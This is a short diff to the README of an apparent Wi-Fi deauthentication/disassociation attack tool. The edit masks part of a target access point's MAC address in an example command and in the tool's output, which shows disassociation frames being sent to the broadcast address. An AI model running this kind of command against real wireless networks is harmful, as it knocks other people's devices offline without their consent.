@@ -45,11 +45,11 @@ Deauth/Disas Attack 1.02a by <verifsec@gmail.com>
 ### Unsafety
 
 ```
-# deauth-attack -i wlan0mon -b 00:23:69:1D:60:22 -m disas
+# deauth-attack -i wlan0mon -b 00:23:69:XX:XX:XX -m disas
 Deauth/Disas Attack 1.02a by <verifsec@gmail.com>
 
 [+] Starting now ...
-[|] Sending the disas flame from 00:23:69:1D:60:22 to ff:ff:ff:ff:ff:ff
+[|] Sending the disas flame from 00:23:69:XX:XX:XX to ff:ff:ff:ff:ff:ff
 [+] Finish. Hopefully it's nothing.
 ```
 
